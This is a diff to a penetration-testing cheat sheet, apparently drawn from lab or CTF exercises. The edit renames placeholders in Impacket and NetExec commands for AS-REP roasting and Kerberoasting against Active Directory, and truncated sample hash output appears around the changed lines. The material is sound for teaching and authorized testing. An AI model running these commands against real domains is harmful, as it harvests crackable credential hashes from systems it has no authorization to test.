@@ -12,7 +12,7 @@ tags: ["Kerberos", "Impacket", "Kerberoasting", "Asreproast", "Rubeus", "Domain 
 
 ```console
 # Multiple valid usernames
-impacket-GetNPUsers <DOMAIN>/ -usersfile <USERS_FILE> -no-pass -dc-ip <DC_IP>
+impacket-GetNPUsers <DOMAIN>/ -usersfile <USERS> -no-pass -dc-ip <DC_IP>
 ```
 
 ```console {class="sample-code"}
@@ -45,7 +45,7 @@ $krb5asrep$23$d.klay@ABSOLUTE.HTB:97c9a3ec7b550c29bc52f0c176738e73$ab25b07d4 ---
 
 ```console
 # Multiple valid usernames
-nxc ldap <DC> -u <USERS_FILE> -p '' --asreproast as_rep_hashes.txt
+nxc ldap <DC> -u <USERS> -p '' --asreproast as_rep_hashes.txt
 ```
 
 ```console {class="sample-code"}
@@ -66,7 +66,7 @@ LDAP        10.10.11.181    445    DC               $krb5asrep$23$d.klay@ABSOLUT
 
 ```console
 # With Password
-sudo ntpdate -s <DC_IP> && impacket-GetUserSPNs -request '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC>
+sudo ntpdate -s <DC_IP> && impacket-GetUserSPNs -request '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
 ```
 
 ```console
@@ -93,7 +93,7 @@ $krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$b62984d5b ---[SNIP]--- f4c2161
 
 ```console
 # Kerberoasting without cred
-sudo ntpdate -s <DC_IP> && impacket-GetUserSPNs -no-preauth <USER_WITH_DONT_REQUIRE_PREAUTH> -usersfile <USERS_FILE> -dc-host <DC> <DOMAIN>/
+sudo ntpdate -s <DC_IP> && impacket-GetUserSPNs -no-preauth <USER_WITH_DONT_REQUIRE_PREAUTH> -usersfile <USERS> -dc-host <DC> <DOMAIN>/
 ```
 
 ```console {class="sample-code"}
